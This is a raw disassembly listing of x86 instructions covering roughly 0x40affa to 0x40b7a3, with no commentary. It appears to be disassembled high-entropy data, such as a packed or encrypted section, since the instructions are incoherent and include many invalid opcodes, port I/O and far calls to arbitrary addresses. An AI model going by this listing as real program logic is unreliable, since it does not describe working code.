  40affa:	ds ins DWORD PTR es:[edi],dx
  40affc:	push   eax
  40affd:	jns    0x40affe
  40afff:	or     al,BYTE PTR [ebp+0x36d5bb32]
  40b005:	cmp    BYTE PTR [eax+esi*2+0x4c],al
  40b009:	lock stos DWORD PTR es:[edi],eax
  40b00b:	inc    eax
  40b00c:	scas   eax,DWORD PTR es:[edi]
  40b00d:	and    al,0xe8
  40b00f:	sub    ch,cl
  40b011:	dec    edi
  40b012:	out    dx,al
  40b013:	outs   dx,BYTE PTR ds:[esi]
  40b014:	or     ch,BYTE PTR [eax]
  40b016:	arpl   WORD PTR [ebx-0x53489726],bp
  40b01c:	in     eax,0xdd
  40b01e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b01f:	and    al,0x39
  40b021:	mov    ss,ecx
  40b023:	cmp    DWORD PTR [ebx+0x2763d22b],esi
  40b029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b02a:	adc    ah,BYTE PTR [esi+0x1153134a]
  40b030:	out    dx,al
  40b031:	add    cl,BYTE PTR [esi]
  40b033:	es jmp 0x40afd2
  40b036:	xor    al,0x92
  40b038:	outs   dx,BYTE PTR ds:[esi]
  40b039:	fwait
  40b03a:	jg     0x40b016
  40b03c:	out    dx,eax
  40b03d:	arpl   WORD PTR [ebx+eax*8+0x2f],di
  40b041:	sub    BYTE PTR [eax+0x7150cfeb],dl
  40b047:	stc    
  40b048:	xchg   ebx,eax
  40b049:	cmp    BYTE PTR [ebp+0x12],ch
  40b04c:	gs mov bl,0x93
  40b04f:	(bad)  
  40b050:	jl     0x40b082
  40b052:	clc    
  40b053:	xor    BYTE PTR [ebp-0x4c1a6359],0x8a
  40b05a:	mov    ebp,DWORD PTR [eax-0x1d]
  40b05d:	cs inc edx
  40b05f:	or     bl,BYTE PTR [ebp-0x709d2728]
  40b065:	cli    
  40b066:	push   esi
  40b067:	ss jae 0x40b065
  40b06a:	repnz cmp al,0xc0
  40b06d:	repnz pop es
  40b06f:	aad    0xbc
  40b071:	adc    eax,0xc507e6e0
  40b076:	(bad)  
  40b077:	cmp    DWORD PTR [ebx+0x38],esp
  40b07a:	test   eax,0x9a4d0142
  40b07f:	aaa    
  40b080:	repz jge 0x40b07a
  40b083:	xchg   edx,eax
  40b084:	test   edx,ebx
  40b086:	jecxz  0x40b029
  40b088:	pop    edi
  40b089:	xchg   edi,eax
  40b08a:	int    0x52
  40b08c:	stos   DWORD PTR es:[edi],eax
  40b08d:	add    edi,DWORD PTR [edx-0x2dc3d08]
  40b093:	outs   dx,DWORD PTR ds:[esi]
  40b094:	push   ss
  40b095:	fmul   QWORD PTR [edx]
  40b097:	outs   dx,BYTE PTR ds:[esi]
  40b098:	mov    dh,BYTE PTR [esi-0x75]
  40b09b:	in     al,dx
  40b09c:	adc    bh,bl
  40b09e:	frstor [ebx+ebx*4-0x351efc8e]
  40b0a5:	mov    ecx,0xac48925
  40b0aa:	inc    ecx
  40b0ab:	call   0x8cb0:0xf02e7a3a
  40b0b2:	jp     0x40b057
  40b0b4:	mov    cl,0x80
  40b0b6:	cmp    bl,BYTE PTR [ecx+edx*1]
  40b0b9:	repz (bad) 
  40b0bb:	popf   
  40b0bc:	repz pop ecx
  40b0be:	mov    ds:0x4aa4d9ab,al
  40b0c3:	(bad)  
  40b0c4:	int3   
  40b0c5:	push   edi
  40b0c6:	mov    edx,esp
  40b0c8:	push   0x23
  40b0ca:	jno    0x40b0b8
  40b0cc:	inc    ebx
  40b0cd:	ss jnp 0x40b138
  40b0d0:	mul    DWORD PTR [edx+0x1a]
  40b0d3:	popa   
  40b0d4:	mov    dl,0x9
  40b0d6:	xchg   edx,eax
  40b0d7:	xor    al,0x78
  40b0d9:	cdq    
  40b0da:	call   0x7ac5:0xc1db04df
  40b0e1:	sar    BYTE PTR [ebp+0x4b],1
  40b0e4:	ds cmp ecx,esi
  40b0e7:	pop    edi
  40b0e8:	(bad)  
  40b0ea:	mov    ebx,0xe547ffdf
  40b0ef:	mov    ds:0xd030a899,al
  40b0f4:	pop    eax
  40b0f5:	cmp    DWORD PTR [esp+edx*1-0x180e5ebe],edx
  40b0fc:	test   eax,0xb0bb6602
  40b101:	addr16 inc ecx
  40b103:	fwait
  40b104:	pop    ecx
  40b105:	add    ah,BYTE PTR [edi]
  40b107:	mov    ch,0x68
  40b109:	test   eax,0x5d2a3323
  40b10e:	xor    DWORD PTR [edx],esp
  40b110:	shl    BYTE PTR [edx],1
  40b112:	xchg   esp,ebp
  40b114:	cmp    DWORD PTR [esp+edx*1+0x2bbf509b],eax
  40b11b:	mov    ebp,0x28787ecb
  40b120:	xor    BYTE PTR [edx+0x59],ch
  40b123:	dec    eax
  40b124:	and    al,0x5a
  40b126:	push   cs
  40b127:	jae    0x40b129
  40b129:	lods   eax,DWORD PTR ds:[esi]
  40b12a:	xchg   dl,bl
  40b12c:	push   edi
  40b12d:	inc    eax
  40b12e:	inc    BYTE PTR [ecx-0xaaa3fb6]
  40b134:	out    0xd9,al
  40b136:	sub    DWORD PTR [eax],edi
  40b138:	xor    cl,ch
  40b13a:	cmp    eax,0xdf90e533
  40b13f:	or     ah,BYTE PTR [eax]
  40b141:	mov    dh,0xe1
  40b143:	and    ebx,DWORD PTR [esi+0x3e]
  40b146:	inc    ecx
  40b147:	out    dx,eax
  40b148:	xchg   esi,eax
  40b149:	jno    0x40b132
  40b14b:	push   edi
  40b14c:	sub    ebx,DWORD PTR [edx-0x5b]
  40b14f:	rcl    ebp,0xa3
  40b152:	jge    0x40b0f8
  40b154:	adc    al,0x16
  40b156:	shl    ecx,1
  40b158:	shr    cl,1
  40b15a:	pop    ebp
  40b15b:	fcmovnbe st,st(6)
  40b15d:	dec    esi
  40b15e:	pop    ebx
  40b15f:	in     eax,0xc3
  40b161:	push   ecx
  40b162:	(bad)  
  40b164:	mov    ebp,0xa2d0ead1
  40b169:	xor    DWORD PTR [eax-0x7c],eax
  40b16c:	dec    edx
  40b16d:	arpl   WORD PTR gs:[ecx+0x2b],ax
  40b171:	cmp    DWORD PTR [edi],ecx
  40b173:	mov    edx,esp
  40b175:	addr16 std 
  40b177:	add    al,0xea
  40b179:	clc    
  40b17a:	xchg   esp,eax
  40b17b:	xor    eax,0xa306a234
  40b180:	inc    esp
  40b181:	in     eax,0x6a
  40b183:	call   0x58486494
  40b188:	inc    edx
  40b189:	pop    esp
  40b18a:	push   edi
  40b18b:	and    al,0xe2
  40b18d:	mov    edi,0x408ffddd
  40b192:	ret    0x832e
  40b195:	adc    DWORD PTR [eax+0x51],ecx
  40b198:	iret   
  40b199:	pop    esi
  40b19a:	ss cs dec edi
  40b19d:	jle    0x40b20b
  40b19f:	aas    
  40b1a0:	cmp    bl,BYTE PTR [esi+0x39715497]
  40b1a6:	jo     0x40b1ba
  40b1a8:	mov    ch,0x2f
  40b1aa:	cmp    al,0xa0
  40b1ac:	dec    edi
  40b1ad:	mov    ch,0x7d
  40b1af:	pop    es
  40b1b0:	ficom  DWORD PTR [esi]
  40b1b2:	dec    ecx
  40b1b3:	(bad)
  40b1b7:	test   al,0xc
  40b1b9:	jnp    0x40b1f1
  40b1bb:	dec    edx
  40b1bc:	leave  
  40b1bd:	js     0x40b1d5
  40b1bf:	lods   eax,DWORD PTR ds:[esi]
  40b1c0:	fwait
  40b1c1:	push   eax
  40b1c2:	lock call 0x74b30fa8
  40b1c8:	and    eax,0xbb45a6e5
  40b1cd:	adc    BYTE PTR [ebp-0x1a86a5ca],dl
  40b1d3:	adc    ch,BYTE PTR [esi-0x1a5531db]
  40b1d9:	lahf   
  40b1da:	xor    ch,bl
  40b1dc:	idiv   DWORD PTR [ecx+ecx*4+0x651b18b3]
  40b1e3:	rcr    BYTE PTR [esi+0x78],cl
  40b1e6:	add    BYTE PTR [ebx+0x47],ah
  40b1e9:	je     0x40b234
  40b1eb:	shl    BYTE PTR [ebp+0x7ec7156d],cl
  40b1f1:	cs push ds
  40b1f3:	sub    edx,0x47b86217
  40b1f9:	push   eax
  40b1fa:	sbb    ecx,ecx
  40b1fc:	ss jo  0x40b1a8
  40b1ff:	call   0xa14f:0x33fb227b
  40b206:	pop    ecx
  40b207:	jmp    0x102f29ac
  40b20c:	cli    
  40b20d:	xchg   esi,ebp
  40b20f:	int3   
  40b210:	mov    ds:0x62db8982,al
  40b215:	xchg   esi,edx
  40b217:	mov    ecx,0xf3485ec7
  40b21c:	adc    DWORD PTR [edx+0x60038ff9],ecx
  40b222:	push   ebp
  40b223:	adc    BYTE PTR [ecx+eax*1],dh
  40b226:	sbb    DWORD PTR [ebp+0x1c75db8b],0xffffffaa
  40b22d:	mov    ds:0xeabe242,al
  40b232:	jno    0x40b283
  40b234:	gs stos BYTE PTR es:[edi],al
  40b236:	mov    esp,esi
  40b238:	shl    DWORD PTR [edx+eax*1],1
  40b23b:	cmp    al,0xb3
  40b23d:	sub    eax,DWORD PTR [edi]
  40b23f:	xchg   edx,eax
  40b240:	pop    ecx
  40b241:	jns    0x40b215
  40b243:	jnp    0x40b1d3
  40b245:	sub    al,0xe8
  40b247:	int    0x34
  40b249:	mov    esi,0x6edf642f
  40b24e:	call   0x39ff:0x9fdb14f2
  40b255:	bound  esi,QWORD PTR [edx+0x5491ed50]
  40b25b:	pusha  
  40b25c:	repz pop ds
  40b25e:	out    dx,eax
  40b25f:	push   ss
  40b260:	or     ch,BYTE PTR [ebp-0x6b19ac1b]
  40b266:	(bad)  
  40b267:	lods   al,BYTE PTR ds:[esi]
  40b268:	and    bl,al
  40b26a:	inc    esp
  40b26b:	jne    0x40b243
  40b26d:	mov    edx,0xb577a790
  40b272:	jge    0x40b1f6
  40b274:	sti    
  40b275:	or     BYTE PTR es:[ebp+0x8],dh
  40b279:	inc    edi
  40b27a:	add    eax,0xe693f824
  40b27f:	sbb    al,0xb1
  40b281:	inc    eax
  40b282:	sahf   
  40b283:	adc    cl,BYTE PTR [edx-0x1d9bb41c]
  40b289:	xchg   edi,eax
  40b28a:	ja     0x40b21a
  40b28c:	add    eax,0xe545eaaa
  40b292:	push   0x73
  40b294:	pop    esi
  40b295:	jbe    0x40b2c5
  40b297:	push   cs
  40b298:	ret    
  40b299:	push   0xfffffff0
  40b29b:	fs dec esi
  40b29d:	sbb    dh,BYTE PTR [edx-0x4fc62c11]
  40b2a3:	push   ecx
  40b2a4:	cmp    ebx,DWORD PTR [eax-0x37]
  40b2a7:	ss sub cl,dl
  40b2aa:	and    dl,ah
  40b2ac:	je     0x40b24e
  40b2ae:	inc    DWORD PTR [edi+0x2ecb72c1]
  40b2b4:	scas   eax,DWORD PTR es:[edi]
  40b2b5:	call   0xc9c5:0xcc27d13a
  40b2bc:	fnstenv [esi+0x65]
  40b2bf:	test   DWORD PTR [edx-0x43],edx
  40b2c2:	add    eax,0x39f6b937
  40b2c7:	sbb    eax,0x79210390
  40b2cc:	or     al,0x68
  40b2ce:	mov    eax,ds:0x72ac3938
  40b2d3:	leave  
  40b2d4:	cs push es
  40b2d6:	dec    edx
  40b2d7:	les    edx,FWORD PTR [ecx-0x846808a]
  40b2dd:	std    
  40b2de:	and    ebp,esp
  40b2e0:	jno    0x40b2a8
  40b2e2:	shr    BYTE PTR ds:0xd9fd00db,0x6b
  40b2e9:	sub    dh,BYTE PTR [edx]
  40b2eb:	aaa    
  40b2ec:	push   ds
  40b2ed:	fild   DWORD PTR [ecx+0x7a]
  40b2f0:	imul   esp,DWORD PTR [ecx-0xd5540dc],0x5f
  40b2f7:	push   esp
  40b2f8:	jle    0x40b353
  40b2fa:	adc    edi,ecx
  40b2fc:	lods   eax,DWORD PTR ds:[esi]
  40b2fd:	mov    bh,0xee
  40b2ff:	mov    edx,0xb7dd2c61
  40b304:	stos   BYTE PTR es:[edi],al
  40b305:	into   
  40b306:	cmp    DWORD PTR [ecx+0xd],edx
  40b309:	add    ebp,DWORD PTR [ebp-0x13]
  40b30c:	int3   
  40b30d:	xlat   BYTE PTR ds:[ebx]
  40b30e:	in     eax,0x32
  40b310:	inc    eax
  40b311:	repz or al,0xac
  40b314:	pop    esi
  40b315:	xor    eax,0x54ff3c98
  40b31a:	out    0xb3,eax
  40b31c:	imul   DWORD PTR [ebx]
  40b31e:	fwait
  40b31f:	sbb    eax,0x7742ab0e
  40b324:	fs mov ecx,0xfce15fa1
  40b32a:	pop    ecx
  40b32b:	into   
  40b32c:	and    eax,0xaebd3409
  40b331:	stos   BYTE PTR es:[edi],al
  40b332:	test   BYTE PTR [edi],0x24
  40b335:	lods   al,BYTE PTR ds:[esi]
  40b336:	sub    ebp,ecx
  40b338:	mov    BYTE PTR [esi-0x4c5b16b1],cl
  40b33e:	arpl   sp,cx
  40b340:	into   
  40b341:	les    eax,FWORD PTR [eax-0x6aacaa5]
  40b347:	add    ebp,DWORD PTR [ecx-0xcd8ffdd]
  40b34d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b34e:	pusha  
  40b34f:	mov    BYTE PTR [eax],cl
  40b351:	jno    0x40b36c
  40b353:	fdiv   QWORD PTR [edx+edx*8+0x48e54b12]
  40b35a:	test   DWORD PTR [edx+0x6c3da38c],esp
  40b360:	push   esi
  40b361:	jp     0x40b347
  40b363:	fucomp st(5)
  40b365:	mov    edi,DWORD PTR [ebx+0x7b]
  40b368:	ss xchg ecx,eax
  40b36a:	sbb    DWORD PTR [eax+0x70376191],ebp
  40b370:	into   
  40b371:	ins    BYTE PTR es:[edi],dx
  40b372:	daa    
  40b373:	dec    esp
  40b374:	cmc    
  40b375:	popf   
  40b376:	fsubr  DWORD PTR [edi-0x4c]
  40b379:	mov    dh,0x63
  40b37b:	jle    0x40b340
  40b37d:	sub    ah,BYTE PTR [ecx+0x463bbac0]
  40b383:	add    DWORD PTR ds:0x56c231db,eax
  40b389:	or     eax,0xce09dbf1
  40b38e:	aad    0xf3
  40b390:	bound  ecx,QWORD PTR [esi-0x7c]
  40b393:	call   0xb5c2accb
  40b398:	jb     0x40b380
  40b39a:	jge    0x40b3a5
  40b39c:	inc    edx
  40b39d:	mov    ebx,0xd065900b
  40b3a2:	add    bh,ah
  40b3a4:	ret    
  40b3a5:	sbb    dh,BYTE PTR [ebx]
  40b3a7:	addr16 test eax,0xd01f5cda
  40b3ad:	xor    BYTE PTR [edx+0x3e],bl
  40b3b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3b1:	stos   DWORD PTR es:[edi],eax
  40b3b2:	loopne 0x40b3a3
  40b3b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3b5:	add    dh,bl
  40b3b7:	mov    ebx,0xc35b1460
  40b3bc:	ja     0x40b3cc
  40b3be:	dec    edi
  40b3bf:	idiv   BYTE PTR [eax+edx*2]
  40b3c2:	pop    ss
  40b3c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3c4:	rcr    dh,1
  40b3c6:	push   eax
  40b3c7:	jl     0x40b3d7
  40b3c9:	push   ebx
  40b3ca:	ret    
  40b3cb:	push   0xccd98afe
  40b3d0:	sbb    DWORD PTR [edi-0x7af8cb5d],esi
  40b3d6:	addr16 sub al,0xd5
  40b3d9:	sbb    DWORD PTR [ebx+0x18],0xa20b9143
  40b3e0:	mov    al,0x94
  40b3e2:	push   esi
  40b3e3:	mov    ebx,0xb77008bb
  40b3e8:	add    al,0x1f
  40b3ea:	lods   al,BYTE PTR ds:[esi]
  40b3eb:	fwait
  40b3ec:	push   eax
  40b3ed:	jmp    0x40b445
  40b3ef:	mov    ebx,0x8c2ad65f
  40b3f4:	add    al,0xbb
  40b3f6:	mov    eax,ds:0x70044729
  40b3fb:	leave  
  40b3fc:	sbb    DWORD PTR [edx],eax
  40b3fe:	pop    edx
  40b3ff:	and    BYTE PTR [ecx],al
  40b401:	(bad)  
  40b402:	retf   0xffa9
  40b405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b406:	mov    ebp,0x4cee4623
  40b40b:	inc    edx
  40b40c:	sub    al,0xd
  40b40e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b40f:	cmc    
  40b410:	mov    eax,ds:0x9e9e4b54
  40b415:	(bad)  
  40b416:	sub    BYTE PTR [edi+ecx*2+0x49],ah
  40b41a:	sub    BYTE PTR [eax],ah
  40b41c:	(bad)
  40b41f:	retf   
  40b420:	inc    ebp
  40b421:	sbb    ah,dl
  40b423:	shr    DWORD PTR [ebx+eax*4+0x6],1
  40b427:	lods   al,BYTE PTR ds:[esi]
  40b428:	inc    esp
  40b429:	ja     0x40b3b0
  40b42b:	cmp    BYTE PTR [eax+esi*4+0x63],0xf6
  40b430:	imul   esi,edx,0x5f7814ba
  40b436:	inc    ebx
  40b437:	ret    0x15ce
  40b43a:	shr    edi,0x9b
  40b43d:	mov    eax,ds:0xeb2853d6
  40b442:	pop    bx
  40b444:	test   al,0x7e
  40b446:	test   cl,ch
  40b448:	lods   eax,DWORD PTR ds:[esi]
  40b449:	fild   WORD PTR [eax-0x3a]
  40b44c:	add    DWORD PTR [esi+0x65],edi
  40b44f:	mov    ecx,0x5b301e46
  40b454:	fsubr  DWORD PTR [ebx-0x33]
  40b457:	daa    
  40b458:	jmp    0xb4bf:0xdf149e2e
  40b45f:	lahf   
  40b460:	and    BYTE PTR [ecx-0x6f5d8d27],dl
  40b466:	test   al,0xcd
  40b468:	pop    DWORD PTR ds:0xf5d8c5a6
  40b46e:	mov    ds:0x522d98a0,eax
  40b473:	inc    ebp
  40b474:	test   eax,0x41a62de7
  40b479:	data16 adc ch,BYTE PTR [ecx-0x6f]
  40b47d:	jmp    0x3fb8:0xdcdc6830
  40b484:	retf   
  40b485:	dec    ebp
  40b486:	cmp    DWORD PTR [ecx+0x1973d3fc],ebx
  40b48c:	call   0xc8f8fcee
  40b491:	scas   eax,DWORD PTR es:[edi]
  40b492:	sahf   
  40b493:	lahf   
  40b494:	sbb    bl,ch
  40b496:	adc    al,0x3b
  40b498:	in     al,dx
  40b499:	xor    edi,DWORD PTR [eax]
  40b49b:	dec    edx
  40b49c:	ins    DWORD PTR es:[edi],dx
  40b49d:	scas   al,BYTE PTR es:[edi]
  40b49e:	xor    bl,BYTE PTR [ebp-0x7a2c9c0e]
  40b4a4:	xchg   esi,eax
  40b4a5:	pop    ebp
  40b4a6:	push   0xffffff83
  40b4a8:	loope  0x40b4cb
  40b4aa:	xlat   BYTE PTR ds:[ebx]
  40b4ab:	mov    al,bh
  40b4ad:	call   0x34a783fe
  40b4b2:	mov    cl,ah
  40b4b4:	jecxz  0x40b4b5
  40b4b6:	cmp    eax,0x9ca8e755
  40b4bb:	test   al,0x21
  40b4bd:	push   eax
  40b4be:	jb     0x40b4bf
  40b4c0:	cmp    ah,0xfa
  40b4c3:	pop    ebx
  40b4c4:	inc    ebp
  40b4c5:	push   ecx
  40b4c6:	mov    eax,0xd99f72f8
  40b4cb:	ins    DWORD PTR es:[edi],dx
  40b4cc:	fcomi  st,st(5)
  40b4ce:	inc    esp
  40b4cf:	push   ds
  40b4d0:	or     ax,bx
  40b4d3:	mov    eax,ds:0x15e85ddf
  40b4d8:	imul   DWORD PTR [ebp-0x523206f9]
  40b4de:	test   DWORD PTR [ecx],eax
  40b4e0:	repnz int 0xb0
  40b4e3:	lds    edi,FWORD PTR [ecx-0x70651b10]
  40b4e9:	inc    ebp
  40b4ea:	test   eax,0xee2db212
  40b4ef:	fistp  WORD PTR ds:0x6b5f12bd
  40b4f5:	mov    edx,0xd0c309d7
  40b4fa:	ficom  DWORD PTR [ecx]
  40b4fc:	mov    al,0xc2
  40b4fe:	xchg   DWORD PTR [esi+0x58],edx
  40b501:	pop    ebp
  40b502:	stc    
  40b503:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40b505:	or     al,0xb
  40b507:	or     al,0x21
  40b509:	stos   BYTE PTR es:[edi],al
  40b50a:	and    esp,esi
  40b50c:	shr    al,0xbc
  40b50f:	(bad)  
  40b510:	sbb    DWORD PTR [ebp+0x29],ecx
  40b513:	rcl    DWORD PTR [eax],0xe7
  40b516:	in     eax,dx
  40b517:	xor    BYTE PTR [eax],ch
  40b519:	call   0x2c1e:0x9bfb6b28
  40b520:	mov    ecx,0xe96afd3
  40b525:	out    dx,al
  40b526:	stc    
  40b527:	jne    0x40b4cf
  40b529:	mov    ebp,0x7279ed56
  40b52e:	mov    ch,0xe8
  40b530:	add    ebx,DWORD PTR [ecx-0x2a]
  40b533:	push   ebp
  40b534:	push   0x9
  40b536:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b537:	lea    edi,[edi+0x40]
  40b53a:	mov    ecx,0xb513b28
  40b53f:	sbb    eax,0x9db6c718
  40b544:	(bad)  
  40b545:	aas    
  40b546:	dec    ebx
  40b547:	fdivp  st(1),st
  40b549:	adc    DWORD PTR [eax+ecx*8+0x14820f20],edi
  40b550:	mov    edi,0xa33f0098
  40b555:	scas   al,BYTE PTR es:[edi]
  40b556:	inc    eax
  40b557:	mov    ds:0x8f0f2c62,eax
  40b55c:	push   ds
  40b55d:	scas   eax,DWORD PTR es:[edi]
  40b55e:	push   DWORD PTR ds:0x88dc2556
  40b564:	sbb    BYTE PTR ss:[ebp+0x44],dh
  40b568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b569:	xor    DWORD PTR [edx],0x67
  40b56c:	or     ch,BYTE PTR [eax-0x395c1dbc]
  40b572:	pop    edi
  40b573:	popa   
  40b574:	inc    edx
  40b575:	cmp    ch,dl
  40b577:	push   ebp
  40b578:	(bad)  
  40b579:	stc    
  40b57a:	and    eax,DWORD PTR [eax-0x41ebb526]
  40b580:	mov    WORD PTR [ecx+eiz*2+0x60],ss
  40b584:	pop    edx
  40b585:	dec    ebx
  40b586:	or     DWORD PTR [eax-0x4bd8e15a],edi
  40b58c:	adc    eax,0x71a7718
  40b591:	mov    ecx,0x9d8f2908
  40b596:	into   
  40b597:	adc    esi,ecx
  40b599:	out    dx,al
  40b59a:	pusha  
  40b59b:	inc    ecx
  40b59c:	and    bl,al
  40b59e:	data16 xor ah,BYTE PTR [ecx+0x2b]
  40b5a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5a3:	and    eax,0xe8f32aa4
  40b5a8:	add    eax,0xb1aef81a
  40b5ad:	(bad)  
  40b5ae:	ja     0x40b5e3
  40b5b0:	xor    eax,0x5c9eb7
  40b5b5:	dec    ebx
  40b5b6:	xlat   BYTE PTR ds:[ebx]
  40b5b7:	push   esp
  40b5b8:	jo     0x40b5bc
  40b5ba:	in     al,0x18
  40b5bc:	ja     0x40b543
  40b5be:	icebp  
  40b5bf:	shl    ebp,1
  40b5c1:	retf   0xf4d1
  40b5c4:	gs push ds
  40b5c6:	mov    WORD PTR [ecx+edx*4-0x1a],?
  40b5ca:	and    DWORD PTR [edi],edx
  40b5cc:	ins    DWORD PTR es:[edi],dx
  40b5cd:	sahf   
  40b5ce:	mov    esp,DWORD PTR [eax-0x3a]
  40b5d1:	mov    al,ds:0x4b039720
  40b5d6:	xlat   BYTE PTR ds:[ebx]
  40b5d7:	or     ecx,esp
  40b5d9:	fild   QWORD PTR [esi+0x5b]
  40b5dc:	jmp    0x40b61c
  40b5de:	enter  0x3c,0x4d
  40b5e2:	mov    ebx,0x52f3d509
  40b5e7:	jb     0x40b579
  40b5e9:	mov    ds:0x143579c7,eax
  40b5ee:	add    eax,0x4ff4920e
  40b5f3:	jmp    0x40b5a5
  40b5f5:	outs   dx,BYTE PTR ds:[esi]
  40b5f6:	call   0x645d:0x37701386
  40b5fd:	fild   DWORD PTR [esi-0x38c92544]
  40b603:	push   0x7d3a3c8
  40b608:	and    eax,0xd3f22a71
  40b60d:	(bad)  
  40b60e:	xor    BYTE PTR [ebx],ch
  40b610:	fstp   QWORD PTR [ebp-0x25]
  40b613:	xor    bh,BYTE PTR [edx+0x22]
  40b616:	and    DWORD PTR [esi],ebx
  40b618:	es jns 0x40b5f5
  40b61b:	adc    DWORD PTR [esi],0xffffffcf
  40b61e:	mov    bh,0xcb
  40b620:	push   es
  40b621:	adc    eax,0x11113d2a
  40b626:	add    esi,DWORD PTR [ebx]
  40b628:	and    dh,BYTE PTR [ebp-0x6c4819ed]
  40b62e:	push   eax
  40b62f:	jne    0x40b65b
  40b631:	sbb    esp,ebp
  40b633:	add    al,0xdf
  40b635:	daa    
  40b636:	imul   eax,ebp,0xecba21f7
  40b63c:	add    bl,cl
  40b63e:	cmp    BYTE PTR [esi],al
  40b640:	imul   edx,ebx,0xebecb71b
  40b646:	pushf  
  40b647:	cdq    
  40b648:	pop    edi
  40b649:	xchg   ecx,eax
  40b64a:	jl     0x40b69b
  40b64c:	and    BYTE PTR [esi],bh
  40b64e:	push   ebx
  40b64f:	stc    
  40b650:	(bad)  
  40b651:	mov    cl,0xb7
  40b653:	cli    
  40b654:	mov    ds:0x96a524b5,al
  40b659:	(bad)  
  40b65a:	leave  
  40b65b:	sbb    esp,DWORD PTR [eax+0x22]
  40b65e:	jnp    0x40b694
  40b660:	fisubr DWORD PTR [edi+0x71c6e093]
  40b666:	add    BYTE PTR [eax-0x79],cl
  40b669:	test   BYTE PTR [ebx+0x35],ah
  40b66c:	(bad)  
  40b66d:	dec    esi
  40b66e:	sbb    al,0xe0
  40b670:	xchg   edi,eax
  40b671:	repnz push ss
  40b673:	test   al,0x24
  40b675:	inc    ebp
  40b676:	mov    edi,0x3af34264
  40b67b:	aam    0xae
  40b67d:	test   DWORD PTR [esi-0x72afbf40],esi
  40b683:	mov    ecx,fs
  40b685:	and    al,0xab
  40b687:	ror    BYTE PTR [esi+ecx*1+0x68],1
  40b68b:	iret   
  40b68c:	push   esi
  40b68d:	mov    ds:0x10407c48,al
  40b692:	idiv   BYTE PTR [edi-0xa6d211d]
  40b698:	mov    ecx,0xb8e88728
  40b69d:	arpl   WORD PTR [ebp+0x1a],bp
  40b6a0:	and    al,0x95
  40b6a2:	or     al,0x5a
  40b6a4:	and    edx,0x451f2cfb
  40b6aa:	inc    eax
  40b6ab:	add    bl,al
  40b6ad:	ret    
  40b6ae:	mov    WORD PTR [ecx-0x10a6addc],?
  40b6b4:	(bad)  [edx]
  40b6b6:	das    
  40b6b7:	daa    
  40b6b8:	and    eax,0x98ac5884
  40b6bd:	push   ecx
  40b6be:	adc    ecx,DWORD PTR [ecx+eax*8]
  40b6c1:	inc    DWORD PTR [eax+0x3f5231dd]
  40b6c7:	sbb    BYTE PTR [eax+0x3aed3954],bl
  40b6cd:	jmp    0x64f19803
  40b6d2:	ror    DWORD PTR [ebp+0x7ae6f5a1],cl
  40b6d8:	and    eax,0x3d796abb
  40b6dd:	push   ecx
  40b6de:	mov    ds:0xcd85f3c5,al
  40b6e3:	jae    0x40b73e
  40b6e5:	xlat   BYTE PTR ds:[ebx]
  40b6e6:	pushf  
  40b6e7:	out    0xd9,al
  40b6e9:	jb     0x40b713
  40b6eb:	lea    edi,[esi-0x7462c8e8]
  40b6f1:	fstp   QWORD PTR [edx]
  40b6f3:	dec    ecx
  40b6f4:	fcom   DWORD PTR [ebp+0x41]
  40b6f7:	rcr    DWORD PTR [ebp+0x6a77d3c],0xe
  40b6fe:	jbe    0x40b749
  40b700:	cmc    
  40b701:	rcr    dh,cl
  40b703:	xor    ecx,ebp
  40b705:	sbb    ebx,edi
  40b707:	sub    BYTE PTR [ebx],cl
  40b709:	dec    edx
  40b70a:	cmp    eax,0x2fcd783b
  40b70f:	xchg   ecx,eax
  40b710:	mov    ebp,0xe8e2f3f2
  40b715:	mov    WORD PTR [edx-0x61],?
  40b718:	or     BYTE PTR gs:[esi+0x4e80ef],ah
  40b71f:	mov    ebp,0xccfbca8d
  40b724:	xor    DWORD PTR [edx+0x1817c4b8],ecx
  40b72a:	mov    ds:0x156185b3,eax
  40b72f:	jbe    0x40b6f8
  40b731:	sbb    eax,0x33db6730
  40b736:	stc    
  40b737:	pop    edi
  40b738:	cmp    al,0xc3
  40b73a:	cmp    esi,DWORD PTR [eax-0x1ec82a78]
  40b740:	sbb    DWORD PTR [edi+0x4252b0c],edx
  40b746:	mov    ebx,0x74c4aeb7
  40b74b:	sbb    BYTE PTR [edx],dh
  40b74d:	push   eax
  40b74e:	add    al,0x42
  40b750:	inc    eax
  40b751:	std    
  40b752:	mov    bl,0xa9
  40b754:	mov    cl,0xe
  40b756:	dec    esi
  40b757:	scas   eax,DWORD PTR es:[edi]
  40b758:	push   ecx
  40b759:	cmp    DWORD PTR [ebp-0x50],ecx
  40b75c:	pushf  
  40b75d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b75e:	lds    esi,FWORD PTR [edx]
  40b760:	adc    ch,cl
  40b762:	adc    ecx,ebx
  40b764:	(bad)  
  40b765:	cmp    al,0xa7
  40b767:	mov    ah,BYTE PTR [eax-0x75169e58]
  40b76d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b76e:	stc    
  40b76f:	mov    esp,0x7ce0eb0
  40b774:	mov    ebx,0xc09fadf1
  40b779:	pop    ebx
  40b77a:	mov    ah,0x67
  40b77c:	jg     0x40b763
  40b77e:	sub    edi,edi
  40b780:	add    BYTE PTR [eax-0x6b],cl
  40b783:	mov    al,ds:0xf17a9ef2
  40b788:	and    esi,ebx
  40b78a:	out    dx,al
  40b78b:	xchg   al,ah
  40b78d:	in     al,dx
  40b78e:	cmp    ah,cl
  40b790:	repz inc esp
  40b792:	arpl   di,dx
  40b794:	addr16 lahf 
  40b796:	sbb    ah,bl
  40b798:	cld    
  40b799:	or     DWORD PTR [ebx+ebx*2],0xc6333b73
  40b7a0:	fcom   DWORD PTR [edx-0x47]
  40b7a3:	les    edx,FWORD PTR [ecx]
